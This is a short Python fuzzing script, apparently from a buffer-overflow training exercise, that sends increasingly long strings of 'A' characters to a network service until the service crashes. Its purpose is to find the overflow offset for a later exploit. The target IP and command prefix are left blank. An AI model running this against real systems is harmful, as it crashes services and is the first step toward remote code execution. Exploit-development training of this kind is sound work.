#Run this script in order to find the offset at which point you overflow the buffer and crash the application
#Do not run this script in production, as it will trigger a seg fault and crash the application
#This will increment by 100 bytes, from 100-3000. If you need to send more than 3000 bytes just increase the while loop on line 18.
#Once you receive the message that you "Could not connect" you have found the offset that overflows the bounds of the buffer.

import socket, time, sys

#target ip/port
ip = ""
port = 1337
timeout = 5

#cmd that is going to receive user input in order to trigger the overflow
prefix = ""

buffer = []
counter = 100
while len(buffer) < 30:
	buffer.append("A" * counter)
	counter += 100
	
for string in buffer:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		connect = s.connect((ip,port))
		s.recv(1024)
		print("Fuzzing with %s bytes" % len(string))
		s.send(prefix + string + "\r\n")
		s.recv(1024)
		s.close()
	except:
		print("Could not connect to " + ip + ":" + str(port))
		sys.exit(0)
	time.sleep(1)
